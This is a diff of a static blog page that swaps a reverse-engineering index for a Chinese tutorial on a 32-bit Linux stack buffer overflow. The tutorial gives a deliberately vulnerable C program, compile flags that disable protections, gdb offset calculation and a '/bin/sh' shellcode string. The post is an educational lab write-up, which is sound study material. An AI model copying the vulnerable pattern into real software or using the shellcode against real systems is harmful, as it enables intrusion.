@@ -6,18 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://niwbie.github.io">
-  <title>逆向及病毒分析技术 | isee&#39;blog</title>
+  <title>Linux下的缓冲区溢出攻击(一) | isee&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="整理了一下逆向及病毒分析的学习历程">
+  <meta name="description" content="缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="逆向及病毒分析技术">
-<meta property="og:url" content="https://niwbie.github.io/2017/03/19/逆向及病毒分析技术/index.html">
+<meta property="og:title" content="Linux下的缓冲区溢出攻击(一)">
+<meta property="og:url" content="https://niwbie.github.io/2016/11/21/Linux下的缓冲区溢出攻击(一)/index.html">
 <meta property="og:site_name" content="isee'blog">
-<meta property="og:description" content="整理了一下逆向及病毒分析的学习历程">
-<meta property="og:updated_time" content="2017-03-18T06:35:01.468Z">
+<meta property="og:description" content="缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/1.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/2.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/3.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/4.png">
+<meta property="og:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/5.png">
+<meta property="og:updated_time" content="2017-11-12T07:01:23.156Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="逆向及病毒分析技术">
-<meta name="twitter:description" content="整理了一下逆向及病毒分析的学习历程">
+<meta name="twitter:title" content="Linux下的缓冲区溢出攻击(一)">
+<meta name="twitter:description" content="缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。">
+<meta name="twitter:image" content="https://niwbie.github.io/image/Linux下的缓冲区溢出攻击/1.png">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -133,7 +139,7 @@
 </nav>
 
       <div class="body-wrap">
-        <article id="post-逆向及病毒分析技术" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Linux下的缓冲区溢出攻击(一)" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -143,7 +149,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      逆向及病毒分析技术
+      Linux下的缓冲区溢出攻击(一)
     </h1>
   
       
@@ -151,19 +157,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="整理了一下逆向及病毒分析的学习历程"><a href="#整理了一下逆向及病毒分析的学习历程" class="headerlink" title="整理了一下逆向及病毒分析的学习历程"></a>整理了一下逆向及病毒分析的学习历程</h1><a id="more"></a>
-<h2 id="逆向部分"><a href="#逆向部分" class="headerlink" title="逆向部分"></a>逆向部分</h2><h3 id="1-第一次逆向分析"><a href="#1-第一次逆向分析" class="headerlink" title="1. 第一次逆向分析"></a>1. <a href="/2015/07/21/第一次逆向分析/index.html">第一次逆向分析</a></h3><h3 id="2-C函数调用和堆栈"><a href="#2-C函数调用和堆栈" class="headerlink" title="2. C函数调用和堆栈"></a>2. <a href="/2016/09/22/C函数调用和堆栈/index.html">C函数调用和堆栈</a></h3><h3 id="3-简单的分配栈帧及溢出修改相邻变量"><a href="#3-简单的分配栈帧及溢出修改相邻变量" class="headerlink" title="3. 简单的分配栈帧及溢出修改相邻变量"></a>3. <a href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/index.html">简单的分配栈帧及溢出修改相邻变量</a></h3><h3 id="4-JMP指令转换公式"><a href="#4-JMP指令转换公式" class="headerlink" title="4. JMP指令转换公式"></a>4. <a href="/2016/03/17/JMP指令转换公式/index.html">JMP指令转换公式</a></h3><h3 id="5-declspec-naked-作用"><a href="#5-declspec-naked-作用" class="headerlink" title="5. __declspec(naked)作用"></a>5. <a href="/2016/03/17/declspec-naked-详解/index.html">__declspec(naked)作用</a></h3><h3 id="6-retn的作用"><a href="#6-retn的作用" class="headerlink" title="6. retn的作用"></a>6. <a href="/2016/05/17/retn的作用/index.html">retn的作用</a></h3><h3 id="7-一个简单的qq盗号木马分析"><a href="#7-一个简单的qq盗号木马分析" class="headerlink" title="7. 一个简单的qq盗号木马分析"></a>7. <a href="/2016/07/15/一个简单的QQ盗号木马分析/index.html">一个简单的qq盗号木马分析</a></h3><h3 id="8-第一次去除花指令"><a href="#8-第一次去除花指令" class="headerlink" title="8. 第一次去除花指令"></a>8. <a href="/2016/11/20/看雪CrackMe第三题之去除花指令/index.html">第一次去除花指令</a></h3><h3 id="9-一道简单的去花指令练习"><a href="#9-一道简单的去花指令练习" class="headerlink" title="9. 一道简单的去花指令练习"></a>9. <a href="/2017/03/17/一道E语言的CTF题/index.html">一道简单的去花指令练习</a></h3><h3 id="10-文件补丁"><a href="#10-文件补丁" class="headerlink" title="10. 文件补丁"></a>10. <a href="/2017/03/17/文件补丁/index.html">文件补丁</a></h3><h3 id="11-逆向之RC4算法"><a href="#11-逆向之RC4算法" class="headerlink" title="11. 逆向之RC4算法"></a>11. <a href="/2016/11/19/看雪CTF-2016第五题Writeup/index.html">逆向之RC4算法</a></h3><h3 id="12-逆向进阶之调试多线程程序"><a href="#12-逆向进阶之调试多线程程序" class="headerlink" title="12. 逆向进阶之调试多线程程序"></a>12. <a href="/2016/10/20/爆破一个多线程E语言程序/index.html">逆向进阶之调试多线程程序</a></h3><h3 id="13-又一道多线程调试的练习"><a href="#13-又一道多线程调试的练习" class="headerlink" title="13. 又一道多线程调试的练习"></a>13. <a href="/2016/12/15/看雪CTF-2016第二十题Writeup/index.html">又一道多线程调试的练习</a></h3><h3 id="14-CTF题之shim技术以及-shim详解-http-www-freebuf-com-articles-system-114287-html-gt"><a href="#14-CTF题之shim技术以及-shim详解-http-www-freebuf-com-articles-system-114287-html-gt" class="headerlink" title="14. CTF题之shim技术以及[shim详解](http://www.freebuf.com/articles/system/114287.html&gt;"></a>14. <a href="/2016/12/06/看雪CTF-2016第十四题Writeup/index.html">CTF题之shim技术</a>以及[shim详解](<a href="http://www.freebuf.com/articles/system/114287.html&gt;" target="_blank" rel="external">http://www.freebuf.com/articles/system/114287.html&gt;</a></h3><h3 id="15-一道有意思CTF题–走迷宫"><a href="#15-一道有意思CTF题–走迷宫" class="headerlink" title="15. 一道有意思CTF题–走迷宫"></a>15. <a href="/2017/03/11/百度CTF-reverse1/index.html">一道有意思CTF题–走迷宫</a></h3><h3 id="16-Linux下x64程序的函数调用和堆栈"><a href="#16-Linux下x64程序的函数调用和堆栈" class="headerlink" title="16. Linux下x64程序的函数调用和堆栈"></a>16. <a href="/2017/03/14/Linux下x64程序的函数调用和堆栈/index.html">Linux下x64程序的函数调用和堆栈</a></h3><h3 id="17-一道简单的Linux-x64逆向"><a href="#17-一道简单的Linux-x64逆向" class="headerlink" title="17. 一道简单的Linux x64逆向"></a>17. <a href="/2017/03/18/一道简单的Linux-x64逆向/index.html">一道简单的Linux x64逆向</a></h3>
+        <p>缓冲区攻击的原理我这里就不多说了，原理也比较简单。主要是利用时会碰到许多麻烦，所以还需要耐心的一个个去突破。</p>
+<a id="more"></a>
+<p>这里给出一个Linux下的32位程序的缓冲区溢出，顺便熟悉一下Linux程序的逆向分析，gdb调试、pwntools以及shellcode的编写等等。相对于Windows操作系统下OD调试工具的人性化，gdb调试工具用起来实在是。。。</p>
+<p>漏洞程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int vuln()&#123;</div><div class="line">	char buf[80];</div><div class="line">	int r;</div><div class="line">	r = read(0, buf, 400);</div><div class="line">	printf(&quot;Read %d bytes. buf is %s \n&quot;, r, buf);</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)&#123;</div><div class="line">	vuln();</div><div class="line">	return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里编译时关闭所有的保护机制（关于保护机制的绕过后面再来）<br>Gcc -m32 -z exestack -fno-stack-protector overflow.c -o overflow -g</p>
+<p>程序中很明显是由于read函数读的字符串的大小超过了buf定义的80个字节，所以有可能造成缓冲区溢出破坏堆栈。直接上gdb调试：</p>
+<p>现在printf函数处下断点，然后随便输入一串字符，找到buf的地址：<br><img src="/image/Linux下的缓冲区溢出攻击/1.png" alt="这里写图片描述"></p>
+<p>上面看出buf的地址为 0xffffcfec<br>接着在开一下ret的地址是否是$ebp+4:<br><img src="/image/Linux下的缓冲区溢出攻击/2.png" alt="这里写图片描述"></p>
+<p>0x0804849d，从IDA看出的确是该函数下一个地址：<br><img src="/image/Linux下的缓冲区溢出攻击/3.png" alt="这里写图片描述"></p>
+<p>算出这两个地址相差96个字节，所以我们的思路就是：<br>将shellcode写入缓冲区buf（0xffffcfec），并在96个字节之后，构造输入为0xffffcfec覆盖ret地址，使这个函数结束时跳转到0xffffcfec执行我们的shellcode。</p>
+<p>这里我们的shellcode是为了获取shell。那么问题来了，如何编写shellcode？<br>这里我尝试使用pwntools的shellcraft.i386.linux.sh()，但是并没有成功。从代码来看，次函数利用断点0x80获取shell，但是并没有成功。。。。那么还是自己来写吧。</p>
+<p>其实很简单，直接写一个c程序:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char *argv)&#123;</div><div class="line">	char code[] = &quot;/bin/sh&quot;;</div><div class="line">	execv(code, NULL, NULL);</div><div class="line">	return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译后拖到IDA看：<br><img src="/image/Linux下的缓冲区溢出攻击/4.png" alt="这里写图片描述"></p>
+<p>所以得到shellcode：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Shellcode = &quot;\x55\x89\xe5\x83\xe4\xf0\x83\xec\x20\xc7\x44\x24\x18\x2f\x62\x69\x6e\xc7\x77\x24\x1c\x2f\x73\x68\x00\xc7\x44\x24\x08\x00\x00\x00\x00\xc7\x44\x24\x04\x00\x00\x00\x00\x00\x8d\x44\x24\x18\x89\x04\x24\x8e\xbe\xfe\xff\xff&quot;</div></pre></td></tr></table></figure></p>
+<p>这里加粗处应该根据JMP公式自己计算地址。<br>最终得到shell：<br><img src="/image/Linux下的缓冲区溢出攻击/5.png" alt="这里写图片描述"></p>
+<p>但是其实这里还有许多问题：</p>
+<ol>
+<li>由于最终的堆栈平衡没有做好，所以导致程序崩溃的问题没有解决。</li>
+<li>这是是实际调试的时候，获取到了堆栈的地址，我们才有办法用0xffffcfec去覆盖ret。那么实际运用中，这个堆栈的地址并不知道，该如何去获得呢？</li>
+<li>这里的execv是我们在调试过程中获得的，那么在无法调试的情况下，如何获取程序中任意函数的地址呢？</li>
+<li>由于是关闭了ALSR、NX等保护机制，那么如果开了这些保护机制该怎么办呢？</li>
+</ol>
+
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2017/03/19/逆向及病毒分析技术/" class="archive-article-date">
-  	<time datetime="2017-03-19T08:05:41.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-03-19</time>
+      <a href="/2016/11/21/Linux下的缓冲区溢出攻击(一)/" class="archive-article-date">
+  	<time datetime="2016-11-21T05:06:48.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-21</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
       
@@ -176,18 +203,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/11/12/一道doublefree的pwn/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/11/29/Linux下的缓冲区溢出攻击(二)/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          一道doublefree的pwn
+          Linux下的缓冲区溢出攻击(二)
         
       </div>
     </a>
   
   
-    <a href="/2017/03/18/一道简单的Linux-x64逆向/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">一道简单的Linux x64逆向</div>
+    <a href="/2016/11/21/看雪CTF-2016第十题Writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">看雪CTF-2016第十题Writeup</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -221,7 +248,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="逆向及病毒分析技术" data-title="逆向及病毒分析技术" data-url="https://niwbie.github.io/2017/03/19/逆向及病毒分析技术/"></div>
+	<div class="ds-thread" data-thread-key="Linux下的缓冲区溢出攻击(一)" data-title="Linux下的缓冲区溢出攻击(一)" data-url="https://niwbie.github.io/2016/11/21/Linux下的缓冲区溢出攻击(一)/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
